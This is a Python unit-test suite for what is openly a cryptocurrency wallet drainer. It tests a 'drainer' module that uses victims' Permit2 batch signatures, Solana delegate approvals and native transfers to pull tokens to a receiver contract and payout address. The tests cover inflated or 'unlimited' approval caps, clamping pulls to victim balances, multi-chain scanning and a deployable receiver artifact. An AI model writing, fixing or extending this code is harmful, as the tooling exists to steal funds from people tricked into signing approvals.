"""
Unit tests for the multi-chain registry and the Permit2 batch path.

Run from the repo root:
    python -m unittest discover -s tests -v
"""
import asyncio
import json
import os
import sys
import time
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                               "py_server"))

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import keccak

import abi
import chains
import database
import drainer
import scanners
import solana_tx
import tron_tx

database.init_db()


class RegistryTests(unittest.TestCase):
    def test_required_metadata(self):
        for name, cfg in chains.EVM_NETWORKS.items():
            with self.subTest(chain=name):
                self.assertIsInstance(cfg["chainId"], int)
                self.assertTrue(cfg["rpc"].startswith("http"))
                self.assertTrue(cfg["native"])
                self.assertIsInstance(cfg["testnet"], bool)
                self.assertIn("tokens", cfg)
                self.assertIn("tokenDecimals", cfg)

    def test_chain_ids_unique(self):
        ids = [cfg["chainId"] for cfg in chains.EVM_NETWORKS.values()]
        self.assertEqual(len(ids), len(set(ids)))

    def test_tokens_are_addresses_and_have_decimals(self):
        for name, cfg in chains.EVM_NETWORKS.items():
            for symbol, address in cfg["tokens"].items():
                with self.subTest(chain=name, token=symbol):
                    self.assertTrue(chains.is_evm_address(address))
                    self.assertIn(symbol, cfg["tokenDecimals"])
                    self.assertTrue(0 <= cfg["tokenDecimals"][symbol] <= 36)

    def test_mainnets_exclude_testnets(self):
        mainnets = chains.evm_network_names()
        self.assertNotIn("Sepolia", mainnets)
        self.assertNotIn("BaseSepolia", mainnets)
        self.assertIn("Ethereum", mainnets)
        self.assertIn("BaseSepolia", chains.evm_network_names(include_testnets=True))

    def test_aliases(self):
        self.assertEqual(chains.resolve_network("ethereum mainnet"), "Ethereum")
        self.assertEqual(chains.resolve_network("BSC"), "BSC")
        self.assertEqual(chains.resolve_network("bnb-chain"), "BSC")
        self.assertEqual(chains.resolve_network("zkSync Era"), "zkSync")
        self.assertEqual(chains.resolve_network("base sepolia"), "BaseSepolia")
        self.assertIsNone(chains.resolve_network("not-a-chain"))

    def test_bsc_stables_use_18_decimals(self):
        self.assertEqual(chains.token_decimals("BSC", "USDC"), 18)
        self.assertEqual(chains.token_decimals("BSC", "USDT"), 18)
        self.assertEqual(chains.token_decimals("Ethereum", "USDC"), 6)


class ScannerRoutingTests(unittest.TestCase):
    def test_default_is_all_mainnets(self):
        nets = scanners._networks({"family": "evm"})
        self.assertEqual(nets, chains.evm_network_names())
        self.assertNotIn("Sepolia", nets)

    def test_explicit_list_resolves_aliases(self):
        nets = scanners._networks({"family": "evm",
                                   "networks": '["Ethereum","bsc","Base Sepolia"]'})
        self.assertEqual(nets, ["Ethereum", "BSC", "BaseSepolia"])

    def test_unknown_labels_are_dropped(self):
        nets = scanners._networks({"family": "evm", "networks": ["Ethereum", "Nope"]})
        self.assertEqual(nets, ["Ethereum"])


class CapTests(unittest.TestCase):
    def setUp(self):
        drainer.get_setting = lambda key, default=None: default

    def test_capped_never_below_balance(self):
        cap = drainer.cap_for("evm", 5_000_000 * 10**18, 18)
        self.assertEqual(cap, 10_000_000 * 10**18)

    def test_capped_round_number(self):
        self.assertEqual(drainer.cap_for("evm", 1, 6), 1_000_000 * 10**6)

    def test_family_ceiling(self):
        self.assertLessEqual(drainer.cap_for("evm", 2**200, 18), drainer.UINT160_MAX)
        self.assertLessEqual(drainer.cap_for("solana", 2**70, 9), drainer.U64_MAX)

    def test_unlimited_mode(self):
        drainer.get_setting = lambda key, default=None: (
            "unlimited" if key == "drainer_cap_mode" else default)
        self.assertEqual(drainer.cap_for("evm", 1, 6), drainer.UINT160_MAX)


class NativeKindTests(unittest.TestCase):
    def test_native_grants_use_kind(self):
        # drainer_grants rows carry no `native` column; native_tx is the marker.
        self.assertTrue(drainer._is_native({"kind": "native_tx", "token": None}))
        self.assertFalse(drainer._is_native({"kind": "spl_delegate", "token": "mint"}))

    def test_batch_key_requires_stored_batch(self):
        self.assertIsNone(drainer._batch_key({"network": "Base",
                                             "address": "0x" + "11" * 20,
                                             "batch": None}))


class PermitBatchTests(unittest.TestCase):
    RECEIVER = "0x1111111111111111111111111111111111111111"
    TOKEN_A = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"
    TOKEN_B = "0xfde4c96c8593536e31f229ea8f37b2ada2699bb2"

    def _grant(self, account, details, sig=""):
        deadline = int(time.time()) + 3_600
        batch = {"details": details, "spender": self.RECEIVER, "sigDeadline": deadline}
        return {
            "id": "g1", "network": "Base", "address": account.address,
            "token": details[0]["token"], "cap": str(details[0]["amount"]),
            "nonce": str(details[0]["nonce"]), "sig_deadline": deadline,
            "batch": json.dumps(batch), "signature": sig, "kind": "permit2",
        }

    def test_typed_data_uses_full_batch(self):
        account = Account.create()
        details = [
            {"token": self.TOKEN_A, "amount": 10**12,
             "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 1},
            {"token": self.TOKEN_B, "amount": 2 * 10**12,
             "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 2},
        ]
        typed = drainer._permit_typed_data(self._grant(account, details))
        self.assertEqual(len(typed["message"]["details"]), 2)
        self.assertEqual(typed["message"]["spender"], self.RECEIVER)
        self.assertEqual(typed["primaryType"], "PermitBatch")
        self.assertEqual(typed["domain"]["version"], "1")
        self.assertIn("version", {f["name"] for f in typed["types"]["EIP712Domain"]})

    def test_signature_recovers_against_stored_batch(self):
        account = Account.create()
        details = [
            {"token": self.TOKEN_A, "amount": 10**12,
             "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 7},
        ]
        typed = drainer._permit_typed_data(self._grant(account, details))
        signed = account.sign_message(encode_typed_data(full_message=typed))
        recovered = Account.recover_message(
            encode_typed_data(full_message=typed), signature=signed.signature)
        self.assertEqual(recovered.lower(), account.address.lower())

    def test_batch_key_groups_identical_batches(self):
        account = Account.create()
        details = [{"token": self.TOKEN_A, "amount": 10**12,
                    "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 7}]
        one = self._grant(account, details)
        two = dict(one, id="g2", token=self.TOKEN_B)
        self.assertEqual(drainer._batch_key(one), drainer._batch_key(two))

    def test_pull_encodes_full_batch_and_clamps_amounts(self):
        account = Account.create()
        details = [
            {"token": self.TOKEN_A, "amount": 10**12,
             "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 3},
            {"token": self.TOKEN_B, "amount": 2 * 10**12,
             "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 4},
        ]
        grant = self._grant(account, details, sig="0x" + "11" * 65)
        grant["balance_raw"] = str(5 * 10**11)
        second = dict(grant, id="g2", token=self.TOKEN_B, balance_raw=str(9 * 10**12))

        sent = {}

        async def fake_send(net, key, to, data, value=0):
            sent.update(net=net, to=to, data=data)
            return "0xabc"

        original = (drainer._evm_send, drainer._collector_evm, drainer._payout,
                    drainer._require_key)
        drainer._evm_send = fake_send
        drainer._collector_evm = lambda net: self.RECEIVER
        drainer._payout = lambda fam: "0x2222222222222222222222222222222222222222"
        drainer._require_key = lambda fam: "0x" + "11" * 32
        try:
            txid, picks = asyncio.run(drainer._evm_pull_batch([grant, second]))
        finally:
            (drainer._evm_send, drainer._collector_evm, drainer._payout,
             drainer._require_key) = original

        self.assertEqual(txid, "0xabc")
        self.assertTrue(sent["data"].startswith(abi.SEL_PERMIT_PULL))
        self.assertEqual(sent["to"], self.RECEIVER)
        amounts = {g["token"]: amount for g, amount in picks}
        self.assertEqual(amounts[self.TOKEN_A], 5 * 10**11)      # balance-limited
        self.assertEqual(amounts[self.TOKEN_B], 2 * 10**12)      # cap-limited


class ConsumedBatchTests(unittest.TestCase):
    """A spent Permit2 nonce must never be submitted twice."""

    RECEIVER = "0x1111111111111111111111111111111111111111"
    TOKEN = "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913"

    def _run(self, grant):
        sent = []

        async def fake_send(net, key, to, data, value=0):
            sent.append(data)
            return f"0x{len(sent):064x}"

        original = (drainer._evm_send, drainer._collector_evm, drainer._require_key)
        drainer._evm_send = fake_send
        drainer._collector_evm = lambda net: self.RECEIVER
        drainer._require_key = lambda fam: "0x" + "11" * 32
        try:
            asyncio.run(drainer._evm_pull_batch([grant]))
        finally:
            (drainer._evm_send, drainer._collector_evm,
             drainer._require_key) = original
        return sent

    def test_consumed_batch_uses_pull_permit2(self):
        deadline = int(time.time()) + 3_600
        details = [{"token": self.TOKEN, "amount": 10**12,
                    "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 5}]
        grant = {"id": "g", "network": "Base", "address": "0x" + "22" * 20,
                 "token": self.TOKEN, "balance_raw": str(10**11),
                 "batch": json.dumps({"details": details, "spender": self.RECEIVER,
                                      "sigDeadline": deadline}),
                 "signature": "0x" + "11" * 65, "batch_consumed": 1}
        sent = self._run(grant)
        self.assertEqual(len(sent), 1)
        self.assertTrue(sent[0].startswith(abi.SEL_PULL_PERMIT2))
        self.assertFalse(sent[0].startswith(abi.SEL_PERMIT_PULL))

    def test_permit_amount_is_clamped_to_uint160(self):
        deadline = int(time.time()) + 3_600
        details = [{"token": self.TOKEN, "amount": str(abi.UINT160_MAX),
                    "expiration": abi.PERMIT_DETAILS_FOREVER, "nonce": 6}]
        grant = {"id": "g", "network": "Base", "address": "0x" + "22" * 20,
                 "token": self.TOKEN, "balance_raw": str(abi.UINT160_MAX + 5),
                 "batch": json.dumps({"details": details, "spender": self.RECEIVER,
                                      "sigDeadline": deadline}),
                 "signature": "0x" + "11" * 65, "batch_consumed": 1}
        sent = self._run(grant)
        self.assertEqual(len(sent), 1)
        self.assertTrue(sent[0].startswith(abi.SEL_PULL_PERMIT2))
        # amount word is the last 32 bytes of the calldata
        self.assertEqual(int(sent[0][-64:], 16), abi.UINT160_MAX)


class ReceiverArtifactTests(unittest.TestCase):
    """The committed artifact must be deployable without a compiler."""

    def test_artifact_loads_with_bytecode(self):
        import receiver
        art = receiver.load_artifact()
        self.assertTrue(art["bytecode"].startswith("0x"))
        self.assertGreater(len(art["bytecode"]), 100)

    def test_artifact_exposes_pull_entrypoints(self):
        import receiver
        names = {entry.get("name") for entry in receiver.load_artifact()["abi"]}
        self.assertIn("permitAndPull", names)
        self.assertIn("pullPermit2", names)
        self.assertIn("pullDirect", names)
        self.assertIn("owner", names)

    def test_selectors_match_artifact_signatures(self):
        self.assertEqual(abi.SEL_OWNER, "0x" + keccak(text="owner()")[:4].hex())
        self.assertEqual(abi.SEL_PAYOUT, "0x" + keccak(text="payout()")[:4].hex())


class NonEvmInstructionTests(unittest.TestCase):
    def test_solana_approve_opcode_and_cap(self):
        from solders.pubkey import Pubkey
        owner = Pubkey.new_unique()
        delegate = Pubkey.new_unique()
        token_account = Pubkey.new_unique()
        asset = {"token_account": str(token_account),
                 "program": str(solana_tx.TOKEN_PROGRAM), "cap_raw": 12345}
        ix = solana_tx.approve_ix(asset, delegate, owner)
        self.assertEqual(ix.data[0], solana_tx.IX_APPROVE)
        self.assertEqual(int.from_bytes(ix.data[1:9], "little"), 12345)
        self.assertEqual(str(ix.program_id), str(solana_tx.TOKEN_PROGRAM))

    def test_solana_system_transfer_discriminator(self):
        from solders.pubkey import Pubkey
        ix = solana_tx.system_transfer_ix(Pubkey.new_unique(), Pubkey.new_unique(), 1_000)
        self.assertEqual(ix.data[:4], solana_tx.IX_SYS_TRANSFER.to_bytes(4, "little"))
        self.assertEqual(len(ix.data), 12)

    def test_tron_address_word_is_32_bytes(self):
        word = tron_tx.tron_address_to_word(tron_tx.TRON_USDT)
        self.assertEqual(len(word), 64)
        self.assertTrue(all(c in "0123456789abcdef" for c in word))

    def test_tron_address_validation(self):
        self.assertTrue(tron_tx.is_tron_address(tron_tx.TRON_USDT))
        self.assertFalse(tron_tx.is_tron_address("0x" + "11" * 20))


if __name__ == "__main__":
    unittest.main(verbosity=2)
